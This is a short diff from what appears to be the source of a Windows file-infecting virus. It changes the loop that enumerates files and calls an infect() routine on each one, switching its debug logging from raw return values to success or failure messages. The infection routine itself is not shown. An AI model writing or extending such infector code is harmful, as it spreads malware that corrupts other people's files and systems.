@@ -13,8 +13,11 @@ void run(void) {
     if (hFind != INVALID_HANDLE_VALUE) {
       do {
         PRINT_DEBUG("infecting %s...\n", findData.cFileName);
-        int ret = infect(findData.cFileName, &data);
-        PRINT_DEBUG("ret val = %d\n", ret);
+        if (infect(findData.cFileName, &data) == 0)
+          PRINT_DEBUG("success!\n");
+        else {
+          PRINT_DEBUG("failure!\n");
+        }
       } while (data.functions.findNextFileA(hFind, &findData));
       data.functions.findClose(hFind);
     }
